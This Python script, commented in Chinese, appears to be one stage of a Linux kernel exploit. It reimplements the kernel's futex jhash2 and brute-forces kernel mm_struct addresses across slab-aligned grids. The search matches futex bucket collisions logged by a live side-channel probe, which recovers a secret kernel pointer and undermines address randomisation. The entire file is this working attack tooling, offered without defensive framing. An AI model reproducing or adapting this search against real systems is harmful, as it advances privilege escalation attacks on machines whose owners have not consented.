#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""g2_pair_search.py — 修正约束的离线 G2 搜索。

核心修正：futex_hash_bucket stride=128B（futex_init 反汇编实证），
64B cache line → 桶 b 与 b^1 共享缓存行，锁互踩。
G1 热集 = {B, B^1} 两桶 → 正确约束为：
    (hash(hit_i) >> 1) == (hash(inc) >> 1)  ∀i
旧 G2 用严格同桶（==）约束，真 mm 永不满足 → 零命中矛盾的解释。

网格：
  A. 结构网格: slab_base = W + k*16384 (含 8192 步变体), mm = base + i*896, i<36
     (sizeof(mm_struct)=872, SLUB ALIGN(872,64)=896, order-3 36 objs)
  B. 全 32 网格: W + n*32（896≡0 mod 32, 覆盖所有真 mm）
"""
import numpy as np
import sys

U32 = np.uint32
MASK32 = 0xFFFFFFFF

def rol(w, s):
    if s == 0:
        return w
    return ((w << np.uint32(s)) | (w >> np.uint32(32 - s))) & U32(MASK32)

def jhash2_vec(k0, k1, k2, k3, seed):
    """向量化 jhash2(k[4], 4, seed)，与 e2e2_probe.c / mainline 对齐"""
    init = (0xdeadbeef + (4 << 2)) & MASK32
    a = (init + seed) & MASK32
    b = a.copy()
    c = a.copy()
    a = (a + k0) & MASK32
    b = (b + k1) & MASK32
    c = (c + k2) & MASK32
    # jmix 1 round (length 4 → one full round + case 1 tail)
    a = (a - c) & MASK32; a = (a ^ rol(c, 4)) & MASK32;  c = (c + b) & MASK32
    b = (b - a) & MASK32; b = (b ^ rol(a, 6)) & MASK32;  a = (a + c) & MASK32
    c = (c - b) & MASK32; c = (c ^ rol(b, 8)) & MASK32;  b = (b + a) & MASK32
    a = (a - c) & MASK32; a = (a ^ rol(c, 16)) & MASK32; c = (c + b) & MASK32
    b = (b - a) & MASK32; b = (b ^ rol(a, 19)) & MASK32; a = (a + c) & MASK32
    c = (c - b) & MASK32; c = (c ^ rol(b, 4)) & MASK32;  b = (b + a) & MASK32
    # tail: a += k[0]?? no — length=4: first round consumed k0,k1,k2; remaining 1 word k3
    a = (a + k3) & MASK32
    # jfinal
    c = (c ^ b) & MASK32; c = (c - rol(b, 14)) & MASK32
    a = (a ^ c) & MASK32; a = (a - rol(c, 11)) & MASK32
    b = (b ^ a) & MASK32; b = (b - rol(a, 25)) & MASK32
    c = (c ^ b) & MASK32; c = (c - rol(b, 16)) & MASK32
    a = (a ^ c) & MASK32; a = (a - rol(c, 4)) & MASK32
    b = (b ^ a) & MASK32; b = (b - rol(a, 14)) & MASK32
    c = (c ^ b) & MASK32; c = (c - rol(b, 24)) & MASK32
    return c

def hash_va(va_arr, mm_arr):
    """va_arr, mm_arr: uint64 arrays → bucket (mask-2048 applied later)"""
    va = va_arr.astype(np.uint64)
    mm = mm_arr.astype(np.uint64)
    page = va & ~np.uint64(0xfff)
    off = (va & np.uint64(0xfff)).astype(np.uint32)
    k0 = (mm & np.uint64(0xffffffff)).astype(np.uint32)
    k1 = (mm >> np.uint64(32)).astype(np.uint32)
    k2 = (page & np.uint64(0xffffffff)).astype(np.uint32)
    k3 = (page >> np.uint64(32)).astype(np.uint32)
    return jhash2_vec(k0, k1, k2, k3, off)

def load_result(path):
    hits, inc = [], None
    for line in open(path):
        p = line.split()
        if p[0] == 'hit':
            hits.append(int(p[2], 16))
        elif p[0] == 'inc':
            inc = int(p[1], 16)
    return inc, hits

def main():
    inc, hits = load_result('live_probe/ks_e2e2_result.txt')
    addrs = [inc] + hits
    print('target inc = 0x%x, %d hits' % (inc, len(hits)))
    # 交叉校验 C 模型: 用单点值与 C 实现一致（对 target 自算 hash 与 e2e2 端 G2 判据同源）
    WINDOWS = [
        ('corrected', 0xffffffc000000000, 8 << 30),
        ('legacy   ', 0xffffff8000000000, 8 << 30),
    ]
    STRIDES = [896]
    for name, W, size in WINDOWS:
        # ---- 网格 A: 结构网格 (slab 16K/32K 对齐 + 896*i) ----
        n_base = size // 8192          # 8K 步长覆盖 order-1/2/3 slab 对齐
        for start in range(0, n_base, 2_000_000):
            end = min(start + 2_000_000, n_base)
            k = np.arange(start, end, dtype=np.uint64)
            base = np.uint64(W) + k * np.uint64(8192)
            for i in range(36):
                cand = base + np.uint64(i * 896)
                mm_cand = cand  # 候选 mm 的线性地址
                h_inc = hash_va(np.uint64(inc), mm_cand)
                line0 = h_inc >> U32(1)
                ok = (hash_va(np.uint64(hits[0]), mm_cand) >> U32(1)) == line0
                if not ok.any():
                    continue
                idx = np.nonzero(ok)[0]
                for j in range(1, len(hits)):
                    h = hash_va(np.uint64(hits[j]), mm_cand[idx])
                    ok[idx] &= (h >> U32(1)) == line0[idx]
                idx = np.nonzero(ok)[0]
                for t in idx:
                    print('GRID-A %s hit mm = 0x%016x (base=0x%x i=%d)' %
                          (name, int(mm_cand[t]), int(base[t]), i))
        # ---- 网格 B: 全 32 网格 ----
        n32 = size // 32
        for start in range(0, n32, 8_000_000):
            end = min(start + 8_000_000, n32)
            n = np.arange(start, end, dtype=np.uint64)
            cand = np.uint64(W) + n * np.uint64(32)
            h_inc = hash_va(np.uint64(inc), cand)
            line0 = h_inc >> U32(1)
            ok = (hash_va(np.uint64(hits[0]), cand) >> U32(1)) == line0
            idx = np.nonzero(ok)[0]
            if len(idx):
                c2 = cand[idx]
                l0 = line0[idx]
                for j in range(1, len(hits)):
                    h = hash_va(np.uint64(hits[j]), c2)
                    keep = (h >> U32(1)) == l0
                    c2 = c2[keep]; l0 = l0[keep]
                for t in range(len(c2)):
                    print('GRID-B %s hit mm = 0x%016x' % (name, int(c2[t])))
            print('  %s 32-grid [%dM/%dM)' % (name, start // 1_000_000, n32 // 1_000_000), flush=True)
    print('done')

if __name__ == '__main__':
    main()
